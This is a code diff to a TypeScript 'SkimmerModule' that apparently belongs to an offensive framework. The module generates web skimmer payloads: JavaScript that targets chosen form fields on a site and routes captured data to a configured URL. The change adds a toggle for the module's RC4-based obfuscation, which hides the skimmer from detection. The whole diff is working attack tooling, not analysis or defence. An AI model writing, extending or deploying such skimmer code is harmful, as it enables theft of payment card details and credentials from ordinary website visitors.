@@ -14,6 +14,7 @@ export type SkimmerConfig = {
     url: string;
     target_classes: string[];
     target_ids: string[];
+    obfuscate_payload: boolean;
 };
 
 export default class SkimmerModule extends BaseModule {
@@ -31,8 +32,9 @@ export default class SkimmerModule extends BaseModule {
             url: "",
             target_classes: [],
             target_ids: [],
+            obfuscate_payload: true,
         };
-        this.config = this.loadConfig();
+        this.config = this.loadConfig() as SkimmerConfig;
 
         this.defineCommands({
             generate: {
@@ -53,6 +55,13 @@ export default class SkimmerModule extends BaseModule {
                 validateRegex: Constants.VALID_URL_REGEX,
                 execute: (params: string) => {
                     this.config.url = params;
+                },
+            },
+            "set obfuscate_payload": {
+                arguments: ["<1|0>"],
+                description: "enable or disable payload obfuscation",
+                execute: (params: string) => {
+                    this.config.obfuscate_payload = params != "0" && params != "false" ? true : false;
                 },
             },
             "set data_route": {
@@ -109,21 +118,24 @@ export default class SkimmerModule extends BaseModule {
         skimmerJs = skimmerJs.replace(/\[SKIMMER_IDS\]/, targetIds);
         skimmerJs = skimmerJs.replace(/\s+console\.log\(.+;/g, "");
 
-        let obfs: ObfuscationResult;
-        try {
-            obfs = obfuscate(skimmerJs, {
-                compact: true,
-                controlFlowFlattening: true,
-                transformObjectKeys: true,
-                log: false,
-                renameGlobals: true,
-                stringArray: true,
-                stringArrayEncoding: ["rc4"],
-                identifierNamesGenerator: "mangled",
-            });
-            this.payload = obfs.getObfuscatedCode();
-        } catch (ex) {
-            throw new Error(`failed to obfuscate js payload: ${emsg(ex)}`);
+        this.payload = skimmerJs;
+        if (this.config.obfuscate_payload) {
+            let obfs: ObfuscationResult;
+            try {
+                obfs = obfuscate(skimmerJs, {
+                    compact: true,
+                    controlFlowFlattening: true,
+                    transformObjectKeys: true,
+                    log: false,
+                    renameGlobals: true,
+                    stringArray: true,
+                    stringArrayEncoding: ["rc4"],
+                    identifierNamesGenerator: "mangled",
+                });
+                this.payload = obfs.getObfuscatedCode();
+            } catch (ex) {
+                throw new Error(`failed to obfuscate js payload: ${emsg(ex)}`);
+            }
         }
 
         return { message: `skimmer payload set to: \n${this.payload}` };
